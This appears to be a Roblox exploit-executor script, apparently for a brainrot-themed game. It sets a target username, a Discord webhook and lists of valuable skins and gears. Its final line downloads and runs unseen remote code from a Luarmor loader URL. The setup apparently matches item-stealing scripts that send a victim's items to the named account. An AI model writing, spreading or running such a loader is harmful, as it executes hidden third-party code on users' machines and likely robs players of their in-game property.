-- Mode: NORMAL
getgenv().TARGET_USERNAME = "Deriva70064"
getgenv().WEBHOOK_URL = "https://discord.gg/cleanhub"
getgenv().NORMAL_BRAINROTS = {}
getgenv().NORMAL_BASE_SKINS = {
    ["Summer"] = true,
    ["Rose"] = true,
    ["Tralalero"] = true,
    ["Easter"] = true,
    ["Bunny Basket"] = true,
    ["Octo"] = true,
    ["Lucky"] = true,
    ["Pot of Gold"] = true,
    ["Taco"] = true
}
getgenv().NORMAL_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Candy Sentry"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)